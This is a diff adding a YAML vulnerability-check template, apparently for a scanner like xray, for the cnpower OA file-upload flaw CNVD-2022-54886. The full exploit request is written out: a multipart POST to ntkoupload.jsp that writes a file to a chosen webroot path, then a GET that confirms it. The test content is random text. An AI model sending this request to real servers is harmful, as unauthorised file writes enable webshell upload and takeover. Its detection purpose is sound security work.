@@ -1,0 +1,31 @@
+name: yaml-poc-cnpower-cnpower_oa-file_upload-CNVD-2022-54886
+binding: bfd021e9-5267-42e5-8101-c628a777da25
+detail:
+    author: system_user
+    links:
+        - https://github.com/Phuong39/2022-HW-POC
+    vulnerability:
+        id: 8145a12f-d02f-4689-92de-999634b6ed1b
+        level: high
+    warning: File Upload
+transport: http
+set:
+    s1: randomLowercase(16)
+    s2: randomLowercase(32)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+            body: "------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"{{s1}}.txt\"\r\nContent-Type: image/png\r\n\r\n{{s2}}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\nD:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/{{s1}}.txt\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm-- "
+        expression: response.status == 200 && response.body.bcontains(bytes("Content-Style-Type")) && response.headers["Set-Cookie"].contains("OAapp")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /OAapp/htpages/app/module/login/{{s1}}.txt
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
+expression: r0() && r1()
